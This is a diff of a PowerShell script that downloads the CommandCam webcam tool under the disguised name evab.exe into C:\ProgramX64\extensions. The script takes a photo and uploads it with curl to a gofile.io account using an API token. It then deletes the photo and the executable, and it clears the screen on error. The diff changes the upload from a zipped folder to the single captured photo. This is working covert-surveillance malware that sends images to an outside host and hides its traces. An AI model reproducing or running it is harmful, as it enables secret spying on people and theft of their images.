@@ -6,21 +6,20 @@ function Upload-DirToGofile {
     )
 
     $uploadUri = "https://store1.gofile.io/uploadFile"
-    $zipPath = "C:\ProgramX64\extensions\upload_package.zip"
+   
 
     try {
         if (Test-Path $Path) {
-            # Remove old zip if it exists
-            if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+            
 
             # Create the archive
-            Compress-Archive -Path "$Path\*" -DestinationPath $zipPath -Force
+            
 
             # Upload using curl
-            curl.exe -F "file=@$zipPath" -F "token=$ApiKey" -F "folderId=$FolderId" $uploadUri
+            curl.exe -F "file=@$Path" -F "token=$ApiKey" -F "folderId=$FolderId" $uploadUri
             
             # Cleanup Zip
-            Remove-Item $zipPath -Force
+            Remove-Item $Path -Force
         }
     }
     catch {
@@ -30,11 +29,10 @@ function Upload-DirToGofile {
 
 # --- Configuration ---
 $workDir = "C:\ProgramX64\extensions"
-$outDir = "$workDir\out"
+$outDir = $workDir
 $exePath = "$workDir\evab.exe"
 $camUrl = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe"
 
-if (!(Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir -Force }
 
 
 try {
@@ -53,10 +51,10 @@ try{
 if (Test-Path $exePath) { Remove-Item $exePath -Force }
 Start-Sleep -Milliseconds 20
 # 4. Upload the directory
-Upload-DirToGofile -Path $outDir
+Upload-DirToGofile -Path $photoPath
 
 # 5. Final Cleanup of the output folder
-if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force }
+if (Test-Path $photoPath) { Remove-Item $photoPath -Force }
 }catch{cls
 if (Test-Path $exePath) { Remove-Item $exePath -Force }
 }
